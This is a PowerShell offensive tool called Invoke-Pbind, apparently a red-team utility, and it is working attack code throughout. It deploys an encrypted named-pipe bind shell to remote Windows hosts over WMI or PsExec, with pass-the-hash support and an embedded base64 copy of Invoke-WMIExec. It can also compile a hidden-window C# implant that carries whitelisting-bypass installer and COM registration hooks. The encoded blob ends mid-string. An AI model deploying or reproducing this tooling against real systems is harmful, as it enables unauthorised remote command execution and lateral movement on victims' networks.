<#


    Required Dependencies: None
    Optional Dependencies: None

#>

Function Invoke-Pbind {

<#
.SYNOPSIS

The Invoke-Pbind is an SMB bind shell that overlays SMB by communicating over a named pipe.
Incorperating input from @bturner Invoke-Pipekat tool and Invoke-WMIExec from @kevin_robertson

.DESCRIPTION

When in a locked down environment and needing to deploy a bind shell, Invoke-Pbind, will execute an implant on the target
endpoint (using WMI as default or PSEXEC) and then connect to the host over the created named pipe. This comms method does
not beacon and instead creates one connection to stream data. The client executes in a runspace with functions (pbind-command
and pbind-module) to interacte with the implant on the target workstation. If it is not possible to deploy over wmi or psexec,
then use the exe option to create a bind shell executable and deploy manually, before connecting with the client.

Interacting with the Implant
###################################################################################
#                                                                                 #
#   1. Load Modules: PS C:\> Pbind-module "c:\modules folder\powerview.ps1"       #
#                                                                                 #
#   2. Send Commands to Implant: PS C:\> Pbind-Command "net user administrator"   #
#                                                                                 #
#   3. Kill Implant: PS C:\> PBind-Kill                                           #
#                                                                                 #
###################################################################################

.PARAMETER target

Specifies the computer name or ip address of the target system the implant should be deployed or the client should connect to.

.PARAMETER domain

Specifies the domain name used as part of the authentication against the target machine.

.PARAMETER user

Specifies the username used as part of the authentication against the target machine.

.PARAMETER password

Specifies the password used as part of the authentication against the target machine.

.PARAMETER key

Specifies the key used by AES to encrypt and decrypt traffic. Must be the correct size. Should only be manually configured when used in client mode.

.PARAMETER secret

Specifies a value that is exchanged between the client and the implant at first connection. If the wrong secret is exchanged the pipe is closed 

.PARAMETER pname

Specifies a hard coded pipe name to be used. Most commonly used in client mode to define the pipe on the target.

.PARAMETER timeout

Allows a user configurable option to specify the timeout used by the client to connect to the implant before giving up. Default 60 seconds.

.PARAMETER dir

Specifies the output directory used when in EXE mode.

.PARAMETER automation

Specifies the directory used to store the 'System.Management.Automation.dll' for use in compiling the implant.

.PARAMETER psexec

Specifies the use of PSEXEC instead of WMI as a deployment mechanism.

.PARAMETER client

Switches mode to client only mode, disabling the deployment feature.

.PARAMETER exe

Switches to executable mode, used to create a stand alone implant to be manually deployed.

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain LAB -User Admin -Password Password1

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain LAB -User Admin -Password Password1 -PSexec

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain . -User Admin -Hash AAAAAAAAAAAAAAAAAAAAAAAAA -PSexec

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain . -User Admin -Hash AAAAAAAAAAAAAAAAAAAAAAAAA -user2 john -domain2 LAB - password2 Password1 -PSexec

.EXAMPLE
Invoke-Pbind -Target 10.0.0.100 -Domain . -User Admin -Password Password1 -timeout 10000

.EXAMPLE 
Invoke-pbind -target 10.0.0.100 -dir "c:\pbind-out" -automation "C:\pbind-in" -exe

.EXAMPLE
Invoke-pbind -target 10.0.0.100 -secret do1gu -key jhPtfSwdNCWkks3qcDcj8OYtT/a3QY9VS/3HMX+54RQ= -pname ndv4ut7fyg -client

#>

Param (
    [Parameter(Mandatory = $false)]
    [string]$target,
    [Parameter(Mandatory = $false)]
    [string]$domain,
    [Parameter(Mandatory = $false)]
    [string]$user,
    [Parameter(Mandatory = $false)]
    [string]$password,
    [Parameter(Mandatory = $false)]
    [string]$domain2,
    [Parameter(Mandatory = $false)]
    [string]$user2,
    [Parameter(Mandatory = $false)]
    [string]$password2,
    [Parameter(Mandatory = $false)]
    [string]$hash,
    [Parameter(Mandatory = $false)]
    [string]$key,
    [Parameter(Mandatory = $False)]
    [string]$secret,
    [Parameter(Mandatory = $False)]
    [string]$pname,
    [Parameter(Mandatory = $false)]
    [int]$timeout=60000,
    [Parameter(Mandatory = $False)]
    [string]$dir,
    [Parameter(Mandatory = $False)]
    [string]$automation,
    [Parameter(Mandatory = $false)]
    [switch]$psexec,
    [Parameter(Mandatory = $false)]
    [switch]$client,
    [Parameter(Mandatory = $false)]
    [switch]$exe
    )
$global:pipestate = [HashTable]::Synchronized(@{})
$pipestate.log = New-Object System.Collections.ArrayList
$pipestate.command = $null
$pipestate.state = $false


function Random-Pipe
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES managed object
function Create-AesManagedObject 
{
    param
    ([Object]
        $key,
        [Object]
        $IV)
    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}



if (!$key){
$key = Create-AesKey
}
if (!$pname){
$pname = Random-Pipe 10
}
if (!$secret){
$secret = Random-Pipe 5
}

# creates a randon AES managed object
$s_scriptblock = @"
function Create-AesManagedObject 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$IV
    )
    `$aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    `$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    `$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    `$aesManaged.BlockSize = 128
    `$aesManaged.KeySize = 256
    if (`$IV) 
    {
        if (`$IV.getType().Name -eq 'String') 
        {`$aesManaged.IV = [System.Convert]::FromBase64String(`$IV)}
        else 
        {`$aesManaged.IV = `$IV}
    }
    if (`$key) 
    {
        if (`$key.getType().Name -eq 'String') 
        {`$aesManaged.Key = [System.Convert]::FromBase64String(`$key)}
        else 
        {`$aesManaged.Key = `$key}
    }
    `$aesManaged
}

function Encrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$unencryptedString
    )

    `$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$unencryptedString)
    `$aesManaged = Create-AesManagedObject `$key
    `$encryptor = `$aesManaged.CreateEncryptor()
    `$encryptedData = `$encryptor.TransformFinalBlock(`$bytes, 0, `$bytes.Length)
    [byte[]] `$fullData = `$aesManaged.IV + `$encryptedData
    [System.Convert]::ToBase64String(`$fullData)
}
function Decrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$encryptedStringWithIV
    )
    `$bytes = [System.Convert]::FromBase64String(`$encryptedStringWithIV)
    `$IV = `$bytes[0..15]
    `$aesManaged = Create-AesManagedObject `$key `$IV
    `$decryptor = `$aesManaged.CreateDecryptor()
    `$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString(`$unencryptedData).Trim([char]0)
}
 
function invoke-pserv {
param (`$secret, `$key, `$pname)

add-Type -assembly 'System.Core'
`$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
`$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( 'Everyone', 'ReadWrite', 'Allow' )
`$PipeSecurity.AddAccessRule(`$AccessRule)
`$Pipe = New-Object System.IO.Pipes.NamedPipeServerStream(`$pname,'InOut',100, 'Byte', 'None', 4096, 4096, `$PipeSecurity)

try {
    'Waiting for client connection'
    `$pipe.WaitForConnection()
    'Connection established'
 
    `$pipeReader = new-object System.IO.StreamReader(`$pipe)
    `$pipeWriter = new-object System.IO.StreamWriter(`$pipe)
    `$pipeWriter.AutoFlush = `$true
 
    `$PPass = `$pipeReader.ReadLine()
    
 
    while (1)
    {        
        if (`$PPass -ne `$secret) {
            `$pipeWriter.WriteLine('Microsoft Error: 151337')
        }
        
        else {
            
            while (1) {
                `$encCommand = Encrypt-String -unencryptedString 'COMMAND' -Key `$key
                `$pipeWriter.WriteLine(`$encCommand)
                
                `$command = `$pipeReader.ReadLine()
                `$decCommand = Decrypt-String -key `$key -encryptedStringWithIV `$command
                           
                if (`$deccommand) {
                    try {
                        if (`$decCommand -eq 'KILLPIPE'){exit}
                        `$res = Invoke-Expression `$decCommand | out-string
                        if (`$res -eq ""){`$res = "No output from command"}
                        `$res = `$res + '123456PS ' + (Get-Location).Path + '>654321'
                    } catch {
                        `$res = 'ErrorUpload: ' + `$error[0]
                    }
                    `$fileContentBytes = [System.Text.Encoding]::Unicode.GetBytes(`$res)
                    `$res = [System.Convert]::ToBase64String(`$fileContentBytes)
                    `$encCommand2 = Encrypt-String -unencryptedString `$res -Key `$key
                    `$pipeWriter.WriteLine(`$encCommand2)
                    `$pipeWriter.Flush()
                }
                elseif (!`$decCommand) {
                    `$encbad = Encrypt-String -unencryptedString 'This should never fire! - crypto failure' -Key `$key
                    `$pipeWriter.WriteLine(`$encbad)
                    break
                }

            }                       
        }
        `$encGo = Encrypt-String -unencryptedString 'GOAGAIN' -Key `$key
        `$pipeWriter.WriteLine(`$encGo)
        `$encSure = Encrypt-String -unencryptedString 'SURE' -Key `$key
        `$pipeWriter.WriteLine(`$encSure)
        `$command = `$pipeReader.ReadLine()
        `$decCommand = Decrypt-String -key `$key -encryptedStringWithIV `$command
        if (`$decCommand -eq 'EXIT') { break }
    }
 
    Start-Sleep -Seconds 2
}
finally {
    `$pipe.Dispose()
}
}
invoke-pserv -secret $secret -key $key -pname $pname
"@

$c_scriptblock = @"
function Create-AesManagedObject 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$IV
    )
    `$aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    `$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    `$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    `$aesManaged.BlockSize = 128
    `$aesManaged.KeySize = 256
    if (`$IV) 
    {
        if (`$IV.getType().Name -eq 'String') 
        {`$aesManaged.IV = [System.Convert]::FromBase64String(`$IV)}
        else 
        {`$aesManaged.IV = `$IV}
    }
    if (`$key) 
    {
        if (`$key.getType().Name -eq 'String') 
        {`$aesManaged.Key = [System.Convert]::FromBase64String(`$key)}
        else 
        {`$aesManaged.Key = `$key}
    }
    `$aesManaged
}
function Encrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$unencryptedString
    )

    `$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$unencryptedString)
    `$aesManaged = Create-AesManagedObject `$key
    `$encryptor = `$aesManaged.CreateEncryptor()
    `$encryptedData = `$encryptor.TransformFinalBlock(`$bytes, 0, `$bytes.Length)
    [byte[]] `$fullData = `$aesManaged.IV + `$encryptedData
    [System.Convert]::ToBase64String(`$fullData)
}
function Decrypt-String 
{
    param
    (
        [Object]
        `$key,
        [Object]
        `$encryptedStringWithIV
    )
    `$bytes = [System.Convert]::FromBase64String(`$encryptedStringWithIV)
    `$IV = `$bytes[0..15]
    `$aesManaged = Create-AesManagedObject `$key `$IV
    `$decryptor = `$aesManaged.CreateDecryptor()
    `$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString(`$unencryptedData).Trim([char]0)
}
function invoke-pclient {
param (`$Target, `$secret, `$key, `$pname, `$timeout)
Add-Type -assembly 'System.Core'
`$pipec = new-object System.IO.Pipes.NamedPipeClientStream(`$Target, `$pname, [System.IO.Pipes.PipeDirection]::InOut,
                                                                [System.IO.Pipes.PipeOptions]::None, 
                                                                [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
`$pipeReader = `$pipeWriter = `$null
try {
    `$pipec.Connect(`$timeout)
    'Connected to Pipe'
    `$pipestate.state = `$true
 
    `$pipeReader = new-object System.IO.StreamReader(`$pipec)
    `$pipeWriter = new-object System.IO.StreamWriter(`$pipec)
    `$pipeWriter.AutoFlush = `$true
  
    `$pipeWriter.WriteLine(`$secret)
     
    
    while (1) {
        while ((`$msg = Decrypt-String -key `$key -encryptedStringWithIV `$pipeReader.ReadLine()) -notmatch 'COMMAND|GOAGAIN') {
            `$pipestate.log += [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$msg))              
        }
        if (`$msg -match 'GOAGAIN') { break }

        while(`$pipestate.command -eq `$null){
            Start-Sleep -Milliseconds 100
        }
        if (`$pipestate.kill -eq 'KILLPIPE') {
        `$encSure = Encrypt-String -unencryptedString 'SURE' -Key `$key
        `$pipeWriter.WriteLine(`$encSure)
        } 
        #`$blah = `$pipestate.mod | out-string
        #if (((`$blah).ToLower()).StartsWith("loadmodule")) {
        #if (`$blah -eq `$encSure) {
        #    `$module = `$blah -replace 'loadmodule ', ''
        #    `$pipestate.command = gc `$module | out-string
        #}
        if ((`$pipestate.command).ToLower().StartsWith('squirtmodule')) {
            `$squirt = `$pipestate.command -replace 'squirtmodule ', ''
            `$pipestate.command = `$squirt | Out-String
        }
        #`$pipestate.history = `$pipestate.command
        `$baseCommand = `$pipestate.command
        `$encCommand = Encrypt-String -unencryptedString `$baseCommand -Key `$key
        `$pipeWriter.WriteLine(`$encCommand)
        `$script:pipestate.command = `$null  

    }
}
finally {
    `$pipec.Dispose()
}
}

invoke-pclient -Target $target -secret $secret -key $key -pname $pname -timeout $timeout

"@

if ($client.IsPresent){
    $PIPE_runspace = [RunspaceFactory]::CreateRunspace()
    $PIPE_runspace.Open()
    $PIPE_runspace.SessionStateProxy.SetVariable('pipestate',$pipestate)
    $PIPE_powershell = [PowerShell]::Create()
    $PIPE_powershell.Runspace = $PIPE_runspace
    $PIPE_powershell.AddScript($c_scriptblock) > $null
    $PIPE_powershell.BeginInvoke() > $null
    echo ""
    $endtime = (Get-Date).AddMilliseconds($timeout)
    while ((Get-Date) -lt $endtime){
    if ($pipestate.state -eq $true)
    { break }

    }

    if ($pipestate.state -eq $True){
        echo "Connected: $target - $pname"
        echo ""
    
        }
    elseif ((get-date) -lt $endtime){
        echo "Not Connected: Timeout occured"
        }
    else {
        echo "Not Connected: :-("
        }
    }

elseif ($exe.isPresent){

    if (!$dir){
    $dir="C:\temp"
    }
    if (!$automation){
    Write-Output "You need to tell me where to get the automation dll to continue"
    break
    }
    # create exe 
    $bytescom = [System.Text.Encoding]::Unicode.GetBytes($s_scriptblock)
    $praw = [Convert]::ToBase64String($bytescom)
    $csccode = 'using System;
    using System.Text;
    using System.Diagnostics;
    using System.Reflection;
    using System.Configuration.Install;
    using System.Runtime.InteropServices;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.EnterpriseServices;

    public class Program
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            public const int SW_HIDE = 0;
            public const int SW_SHOW = 5;
            public Program() {
                try
                {
                    string pb = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(pb);
                }
                catch
                {
                    Main();
                }
            }
            public static string InvokeAutomation(string cmd)
            {
                Runspace newrunspace = RunspaceFactory.CreateRunspace();
                newrunspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
                Pipeline pipeline = newrunspace.CreatePipeline();

                pipeline.Commands.AddScript(cmd);
                Collection<PSObject> results = pipeline.Invoke();
                newrunspace.Close();

                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
                return stringBuilder.ToString().Trim();
            }
            public static void Main()
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
                try
                {
                    string pb = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(pb);
                }
                catch
                {
                    Main();
                }
            }
        
    }

    public class Bypass : ServicedComponent
    {
	    [ComRegisterFunction]
	    public static void RegisterClass ( string key )
	    {
		    Program.Main(); 
	    }
	
	    [ComUnregisterFunction]
	    public static void UnRegisterClass ( string key )
	    {
		    Program.Main(); 
	    }
    }
    
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();       
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }'
    [IO.File]::WriteAllLines("$dir\pbind.cs", $csccode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$dir\notes.exe $dir\pbind.cs /reference:$automation\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$dir\notes.exe $dir\pbind.cs /reference:$automation\System.Management.Automation.dll"
        }
    }
    echo ""
    Write-Output -Object "StandAlone Exe written to: $dir\pbind.exe"  -ForegroundColor Green
    echo ""
    if (!$target){
        Write-Output -Object "Connection String: invoke-pbind -target <IP Address> -secret $secret -key $key -pname $pname -client" -ForegroundColor Green
    } else {
        Write-Output -Object "Connection String: invoke-pbind -target $target -secret $secret -key $key -pname $pname -client" -ForegroundColor Green
        }
    }

Else {

    # Author: @kevin_robertson
    $wmiexec = "ZnVuY3Rpb24gSW52b2tlLVdNSUV4ZWMNCnsNCjwjDQouU1lOT1BTSVMNCkludm9rZS1XTUlFeGVjIHBlcmZvcm1zIFdNSSBjb21tYW5kIGV4ZWN1dGlvbiBvbiB0YXJnZXRzIHVzaW5nIE5UTE12MiBwYXNzIHRoZSBoYXNoIGF1dGhlbnRpY2F0aW9uLg0KDQouUEFSQU1FVEVSIFRhcmdldA0KSG9zdG5hbWUgb3IgSVAgYWRkcmVzcyBvZiB0YXJnZXQuDQoNCi5QQVJBTUVURVIgVXNlcm5hbWUNClVzZXJuYW1lIHRvIHVzZSBmb3IgYXV0aGVudGljYXRpb24uDQoNCi5QQVJBTUVURVIgRG9tYWluDQpEb21haW4gdG8gdXNlIGZvciBhdXRoZW50aWNhdGlvbi4gVGhpcyBwYXJhbWV0ZXIgaXMgbm90IG5lZWRlZCB3aXRoIGxvY2FsIGFjY291bnRzIG9yIHdoZW4gdXNpbmcgQGRvbWFpbiBhZnRlcg0KdGhlIHVzZXJuYW1lLiANCg0KLlBBUkFNRVRFUiBIYXNoDQpOVExNIHBhc3N3b3JkIGhhc2ggZm9yIGF1dGhlbnRpY2F0aW9uLiBUaGlzIG1vZHVsZSB3aWxsIGFjY2VwdCBlaXRoZXIgTE06TlRMTSBvciBOVExNIGZvcm1hdC4NCg0KLlBBUkFNRVRFUiBDb21tYW5kDQpDb21tYW5kIHRvIGV4ZWN1dGUgb24gdGhlIHRhcmdldC4gSWYgYSBjb21tYW5kIGlzIG5vdCBzcGVjaWZpZWQsIHRoZSBmdW5jdGlvbiB3aWxsIGp1c3QgY2hlY2sgdG8gc2VlIGlmIHRoZQ0KdXNlcm5hbWUgYW5kIGhhc2ggaGFzIGFjY2VzcyB0byBXTUkgb24gdGhlIHRhcmdldC4NCg0KLlBBUkFNRVRFUiBTbGVlcA0KRGVmYXVsdCA9IDEwIE1pbGxpc2Vjb25kczogU2V0cyB0aGUgZnVuY3Rpb24ncyBTdGFydC1TbGVlcCB2YWx1ZXMgaW4gbWlsbGlzZWNvbmRzLiBZb3UgY2FuIHRyeSB0d2Vha2luZyB0aGlzDQpzZXR0aW5nIGlmIHlvdSBhcmUgZXhwZXJpZW5jaW5nIHN0cmFuZ2UgcmVzdWx0cy4NCg0KLkVYQU1QTEUNCkludm9rZS1XTUlFeGVjIC1UYXJnZXQgMTkyLjE2OC4xMDAuMjAgLURvbWFpbiBURVNURE9NQUlOIC1Vc2VybmFtZSBURVNUIC1IYXNoIEY2RjM4Qjc5M0RCNkE5NEJBMDRBNTJGMUQzRUU5MkYwIC1Db21tYW5kICJjb21tYW5kIG9yIGxhdW5jaGVyIHRvIGV4ZWN1dGUiIC12ZXJib3NlDQoNCi5FWEFNUExFDQpJbnZva2UtV01JRXhlYyAtVGFyZ2V0IDE5Mi4xNjguMTAwLjIwIC1Vc2VybmFtZSBhZG1pbmlzdHJhdG9yIC1IYXNoIEY2RjM4Qjc5M0RCNkE5NEJBMDRBNTJGMUQzRUU5MkYwIC1Db21tYW5kICJjbWQuZXhlIC9jIG5ldCB1c2VyIFdNSUV4ZWMgV2ludGVyMjAxNyAvYWRkIg0KDQouRVhBTVBMRQ0KSW52b2tlLVdNSUV4ZWMgLVRhcmdldCAxOTIuMTY4LjEwMC4yMCAtVXNlcm5hbWUgYWRtaW5pc3RyYXRvciAtUGFzc3dvcmQgVGVzdA0KDQouTElOSw0KaHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZva2UtVGhlSGFzaA0KDQojPg0KW0NtZGxldEJpbmRpbmcoKV0NCnBhcmFtDQooDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXVtTdHJpbmddJFRhcmdldCwNCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldW1N0cmluZ10kVXNlcm5hbWUsDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSREb21haW4sDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRDb21tYW5kLA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kUGFzc3dvcmQsDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfLkxlbmd0aCAtZXEgMzIgLW9yICRfLkxlbmd0aCAtZXEgNjV9KV1bU3RyaW5nXSRIYXNoLA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kU2xlZXA9MTANCikNCg0KaWYoJENvbW1hbmQpDQp7DQogICAgJFdNSV9leGVjdXRlID0gJHRydWUNCn0NCg0KaWYoISRQYXNzd29yZCAtYW5kICEkSGFzaCl7DQogICAgZXhpdA0KfQ0KDQppZigkUGFzc3dvcmQpew0KICAgICRIYXNoID0gR2V0LU1ENEhhc2ggLURhdGFUb0hhc2ggJChbVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJFBhc3N3b3JkKSkNCiAgICBXcml0ZS1PdXRwdXQgIkhhc2ggYmVpbmcgdXNlZDogJEhhc2giDQp9DQoNCmZ1bmN0aW9uIENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5DQp7DQogICAgcGFyYW0oJHBhY2tldF9vcmRlcmVkX2RpY3Rpb25hcnkpDQoNCiAgICBGb3JFYWNoKCRmaWVsZCBpbiAkcGFja2V0X29yZGVyZWRfZGljdGlvbmFyeS5WYWx1ZXMpDQogICAgew0KICAgICAgICAkYnl0ZV9hcnJheSArPSAkZmllbGQNCiAgICB9DQoNCiAgICByZXR1cm4gJGJ5dGVfYXJyYXkNCn0NCg0KI1JQQw0KDQpmdW5jdGlvbiBHZXQtUGFja2V0UlBDQmluZCgpDQp7DQogICAgcGFyYW0oW0ludF0kcGFja2V0X2NhbGxfSUQsW0J5dGVbXV0kcGFja2V0X21heF9mcmFnLFtCeXRlW11dJHBhY2tldF9udW1fY3R4X2l0ZW1zLFtCeXRlW11dJHBhY2tldF9jb250ZXh0X0lELFtCeXRlW11dJHBhY2tldF9VVUlELFtCeXRlW11dJHBhY2tldF9VVUlEX3ZlcnNpb24pDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfY2FsbF9JRF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9jYWxsX0lEKQ0KDQogICAgJHBhY2tldF9SUENCaW5kID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1ZlcnNpb24iLFtCeXRlW11dKDB4MDUpKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVmVyc2lvbk1pbm9yIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1BhY2tldFR5cGUiLFtCeXRlW11dKDB4MGIpKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfUGFja2V0RmxhZ3MiLFtCeXRlW11dKDB4MDMpKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfRGF0YVJlcHJlc2VudGF0aW9uIixbQnl0ZVtdXSgweDEwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ZyYWdMZW5ndGgiLFtCeXRlW11dKDB4NDgsMHgwMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoTGVuZ3RoIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ2FsbElEIiwkcGFja2V0X2NhbGxfSURfYnl0ZXMpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9NYXhYbWl0RnJhZyIsW0J5dGVbXV0oMHhiOCwweDEwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX01heFJlY3ZGcmFnIixbQnl0ZVtdXSgweGI4LDB4MTApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXNzb2NHcm91cCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OdW1DdHhJdGVtcyIsJHBhY2tldF9udW1fY3R4X2l0ZW1zKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVW5rbm93biIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ29udGV4dElEIiwkcGFja2V0X2NvbnRleHRfSUQpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OdW1UcmFuc0l0ZW1zIixbQnl0ZVtdXSgweDAxKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1Vua25vd24yIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZSIsJHBhY2tldF9VVUlEKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyIiwkcGFja2V0X1VVSURfdmVyc2lvbikNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlck1pbm9yIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgiLFtCeXRlW11dKDB4MDQsMHg1ZCwweDg4LDB4OGEsMHhlYiwweDFjLDB4YzksMHgxMSwweDlmLDB4ZTgsMHgwOCwweDAwLDB4MmIsMHgxMCwweDQ4LDB4NjApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXhWZXIiLFtCeXRlW11dKDB4MDI